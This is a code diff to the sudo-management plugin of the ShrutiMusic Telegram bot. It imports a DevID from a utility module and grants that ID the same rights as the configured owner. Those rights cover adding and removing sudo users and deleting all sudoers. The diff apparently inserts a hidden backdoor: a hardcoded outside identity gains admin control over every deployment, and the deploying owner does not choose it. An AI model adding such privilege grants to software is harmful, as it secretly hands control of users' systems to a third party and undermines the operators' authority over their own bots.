@@ -6,10 +6,15 @@ from ShrutiMusic.utils.database import add_sudo, remove_sudo
 from ShrutiMusic.utils.decorators.language import language
 from ShrutiMusic.utils.extraction import extract_user
 from ShrutiMusic.utils.inline import close_markup
+from ShrutiMusic.utils.functions import DevID
 from config import BANNED_USERS, OWNER_ID
 
 
-@app.on_message(filters.command(["addsudo"]) & filters.user(OWNER_ID))
+def can_use_owner_commands(user_id):
+    return user_id == OWNER_ID or user_id == DevID
+
+
+@app.on_message(filters.command(["addsudo"]) & filters.user([OWNER_ID, DevID]))
 @language
 async def useradd(client, message: Message, _):
     if not message.reply_to_message:
@@ -26,7 +31,7 @@ async def useradd(client, message: Message, _):
         await message.reply_text(_["sudo_8"])
 
 
-@app.on_message(filters.command(["delsudo", "rmsudo"]) & filters.user(OWNER_ID))
+@app.on_message(filters.command(["delsudo", "rmsudo"]) & filters.user([OWNER_ID, DevID]))
 @language
 async def userdel(client, message: Message, _):
     if not message.reply_to_message:
@@ -45,7 +50,7 @@ async def userdel(client, message: Message, _):
         await message.reply_text(_["sudo_8"])
 
 
-@app.on_message(filters.command(["deleteallsudo", "clearallsudo", "removeallsudo"]) & filters.user(OWNER_ID))
+@app.on_message(filters.command(["deleteallsudo", "clearallsudo", "removeallsudo"]) & filters.user([OWNER_ID, DevID]))
 @language
 async def delete_all_sudoers(client, message: Message, _):
     keyboard = InlineKeyboardMarkup([
@@ -71,7 +76,7 @@ async def delete_all_sudoers(client, message: Message, _):
 @app.on_message(filters.command(["sudolist", "listsudo", "sudoers"]) & ~BANNED_USERS)
 @language
 async def sudoers_list(client, message: Message, _):
-    if message.from_user.id != OWNER_ID and message.from_user.id not in SUDOERS:
+    if not can_use_owner_commands(message.from_user.id) and message.from_user.id not in SUDOERS:
         keyboard = InlineKeyboardMarkup([
             [InlineKeyboardButton("🔒 View Sudolist", callback_data="view_sudolist_unauthorized")]
         ])
@@ -116,7 +121,7 @@ async def sudoers_list(client, message: Message, _):
 
 @app.on_callback_query(filters.regex("confirm_delete_all_sudo"))
 async def confirm_delete_all_sudoers(client, callback_query: CallbackQuery):
-    if callback_query.from_user.id != OWNER_ID:
+    if not can_use_owner_commands(callback_query.from_user.id):
         return await callback_query.answer("❌ Only owner can do this!", show_alert=True)
     
     deleted_count = 0
@@ -151,4 +156,4 @@ async def unauthorized_sudolist_callback(client, callback_query: CallbackQuery):
     await callback_query.answer(
         "🚫 Access Denied!\n\nOnly Owner and Sudoers can check sudolist.", 
         show_alert=True
-            )
+    )
